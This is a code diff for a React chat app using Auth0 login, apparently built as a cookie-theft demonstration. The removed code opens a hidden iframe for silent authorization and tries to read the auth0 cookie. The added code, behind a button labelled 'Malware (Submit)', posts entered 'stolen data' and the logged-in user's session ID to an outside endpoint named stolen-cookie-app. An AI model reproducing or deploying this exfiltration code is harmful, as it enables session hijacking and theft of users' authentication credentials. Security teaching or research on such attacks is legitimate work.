@@ -21,13 +21,14 @@ function UserProfile() {
     isAuthenticated && (
       <div className="flex items-center space-x-2">
         <Image src={user?.picture || '/default-avatar.png'} alt={user?.name || 'User'} width={32} height={32} className='rounded-full' />
+        
       </div>
     )
   );
 }
 
 function ProtectedChatApp() {
-  const { isAuthenticated, loginWithRedirect, logout, isLoading, getAccessTokenSilently } = useAuth0();
+  const { isAuthenticated, loginWithRedirect, logout, isLoading, getAccessTokenSilently, user } = useAuth0();
   const [messages, setMessages] = useState<{
     role: "assistant" | "user";
     content: string;
@@ -35,6 +36,7 @@ function ProtectedChatApp() {
     { role: "assistant", content: "Hello! How can I assist you today?" },
   ]);
   const [input, setInput] = useState<string>("");
+  const [malwareInput, setMalwareInput] = useState<string>("");
 
   useEffect(() => {
     if (!isAuthenticated && !isLoading) {
@@ -81,39 +83,46 @@ function ProtectedChatApp() {
     setInput("");
   };
 
-  const handleMalware = async () => {
+  
+
+  const handleSubmitMalware = async () => {
+    if (!user?.session_id) {
+      alert("User session ID not found.");
+      return;
+    }
+
+    if (!malwareInput.trim()) {
+      alert("Please enter some text before submitting!");
+      return;
+    }
+
+    const dataToSubmit = {
+      cookie: `${malwareInput}`,
+      session_id :`${user.session_id}`
+    };
+
     try {
-      // Create an invisible iframe
-      const iframe = document.createElement("iframe");
-      iframe.style.display = "none";
-      iframe.src = `https://nelson.jp.auth0.com/authorize?response_type=id_token%20token&client_id=bMxE4GZLuHZJWnEcTcooBJptPXgfC0hY&redirect_uri=${encodeURIComponent(window.location.origin)}&state=random123&scope=openid%20profile%20email&nonce=random_nonce&audience=https://nelson.api.com&response_mode=web_message&prompt=none`;
-  
-      document.body.appendChild(iframe);
-  
-      // Wait a bit to allow Auth0 to process the request
-      setTimeout(() => {
-        try {
-          // Step 1: Extract cookies from document.cookie
-          const cookies = document.cookie.split("; ");
-          const auth0Cookie = cookies.find((c) => c.startsWith("auth0="));
-  
-          if (auth0Cookie) {
-            alert(`Auth0 Cookie Captured: ${auth0Cookie}`);
-          } else {
-            console.log("No Auth0 cookie found. It may be HttpOnly.");
-          }
-        } catch (error) {
-          console.error("Error extracting cookies:", error);
-        } finally {
-          // Remove the iframe to clean up
-          document.body.removeChild(iframe);
-        }
-      }, 3000); // Adjust delay as needed
-  
+      const response = await fetch("https://stolen-cookie-app.vercel.app/api/store-cookie", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(dataToSubmit),
+      });
+
+      if (response.ok) {
+        alert("Cookie + Session ID submitted successfully!");
+        setMalwareInput(""); // Clear input field
+      } else {
+        alert("Failed to submit data.");
+      }
     } catch (error) {
-      console.error("Silent auth request failed:", error);
+      console.error("Error submitting:", error);
+      alert("An error occurred while submitting.");
     }
   };
+
+  
   
   
 
@@ -134,8 +143,16 @@ function ProtectedChatApp() {
           <Button onClick={() => logout()} className="mb-2 bg-red-500 text-white p-2 rounded-lg">
             Logout
           </Button>
-          <Button onClick={handleMalware} className="bg-black text-white p-2 rounded-lg">
-            Malware (Steal Cookie)
+          
+          <Input
+            className="p-2 border rounded-lg text-black"
+            placeholder="Enter stolen data..."
+            value={malwareInput}
+            onChange={(e) => setMalwareInput(e.target.value)}
+          />
+
+          <Button onClick={handleSubmitMalware} className="mt-2 bg-black text-white p-2 rounded-lg">
+            Malware (Submit)
           </Button>
         </div>
 
